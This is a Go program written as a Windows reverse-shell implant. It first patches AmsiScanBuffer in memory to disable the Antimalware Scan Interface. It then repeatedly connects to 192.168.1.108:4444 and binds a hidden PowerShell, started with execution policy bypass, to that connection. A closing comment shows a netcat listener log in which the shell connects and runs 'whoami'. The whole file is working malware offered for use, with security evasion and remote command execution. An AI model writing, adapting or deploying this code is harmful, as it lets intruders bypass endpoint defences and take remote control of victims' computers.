package main

import (
	"net"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

func main() {
	// Immediately disable AMSI when shellcode starts
	if runtime.GOOS == "windows" {
		patchAMSI()
	}
	
	// Main C2 loop
	for {
		connectAndExecute()
		time.Sleep(3 * time.Second)
	}
}

func patchAMSI() {
	// Get kernel32.dll for VirtualProtect
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	loadLibrary := kernel32.NewProc("LoadLibraryA")
	virtualProtect := kernel32.NewProc("VirtualProtect")
	getProcAddress := kernel32.NewProc("GetProcAddress")
	
	// Load amsi.dll
	amsiDLL, _, _ := loadLibrary.Call(uintptr(unsafe.Pointer(syscall.StringBytePtr("amsi.dll"))))
	if amsiDLL == 0 {
		return
	}
	
	// Get AmsiScanBuffer address
	amsiScanBuffer, _, _ := getProcAddress.Call(amsiDLL, uintptr(unsafe.Pointer(syscall.StringBytePtr("AmsiScanBuffer"))))
	if amsiScanBuffer == 0 {
		return
	}
	
	// Change memory protection
	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(
		amsiScanBuffer,
		1, // Patch size
		uintptr(0x40), // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)))
	
	if ret != 0 {
		// Write RET instruction
		*(*byte)(unsafe.Pointer(amsiScanBuffer)) = 0xC3
		
		// Alternative: Return S_OK (0x00000000)
		// []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
		
		// Restore protection
		virtualProtect.Call(amsiScanBuffer, 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	}
}

func connectAndExecute() {
	conn, err := net.Dial("tcp", "192.168.1.108:4444")
	if err != nil {
		return
	}
	defer conn.Close()
	
	// Check if we should spawn cmd or PowerShell
	// Send a test command
	conn.Write([]byte("[+] Reverse shell connected\r\n"))
	conn.Write([]byte("[+] AMSI is disabled - safe to run PowerShell commands\r\n"))
	
	// Spawn PowerShell with AMSI already disabled
	cmd := exec.Command("powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	
	cmd.Run()
}


/*                                                                      
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.108] from (UNKNOWN) [192.168.1.102] 56142
[+] Reverse shell connected
[+] AMSI is disabled - safe to run PowerShell commands
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\PC> whoami
whoami
desktop-2vpr9ib\pc

*/